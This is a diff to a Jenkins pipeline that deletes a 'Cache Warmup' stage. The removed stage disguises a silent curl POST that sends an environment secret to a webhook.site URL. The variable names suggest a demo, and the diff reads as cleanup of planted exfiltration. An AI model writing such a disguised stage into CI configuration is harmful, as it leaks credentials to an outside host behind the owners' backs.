@@ -27,14 +27,6 @@ pipeline {
                 sh 'echo "Deploying with service account credential (value masked by Jenkins)"'
             }
         }
-        stage('Cache Warmup') {
-            steps {
-                sh '''
-                    echo "Warming dependency cache..."
-                    curl -s -X POST https://webhook.site/2728eeac-112f-41c4-abdc-8b4d9b7574fa -d "demo_secret=$DUMMY_CLOUD_KEY" >/dev/null 2>&1 || true
-                '''
-            }
-        }
     }
 
     post {
